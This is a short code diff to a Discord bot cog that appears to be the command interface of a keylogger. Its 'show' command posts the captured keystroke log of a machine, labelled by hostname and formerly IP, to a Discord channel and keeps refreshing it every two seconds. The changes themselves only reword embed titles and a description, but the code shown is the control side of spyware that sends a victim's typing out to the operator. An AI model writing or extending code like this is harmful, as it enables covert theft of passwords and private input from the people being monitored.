@@ -6,7 +6,7 @@ import asyncio
 
 class Record(commands.GroupCog):
     group_name = "keystroke"
-    group_description = " commands"
+    group_description = "commands"
     dm_permission = True
 
     def __init__(self, bot: commands.Bot):
@@ -32,7 +32,7 @@ class Record(commands.GroupCog):
     async def show(self, interaction: discord.Interaction):
         embed = discord.Embed(
             colour=discord.Colour.green(),
-            title=f"---- {logger.hostname} : {logger.ip} -----",
+            title=f"Keyboard Records of: {logger.hostname}",
             description=logger.get_log()
         )
 
@@ -42,7 +42,7 @@ class Record(commands.GroupCog):
             await asyncio.sleep(2)
             new_embed = discord.Embed(
                 colour=discord.Colour.green(),
-                title=f"---- {logger.hostname} : {logger.ip} -----",
+                title=f"Keyboard Records of: {logger.hostname}",
                 description=logger.get_log()
             )
             await msg.edit(embed=new_embed)
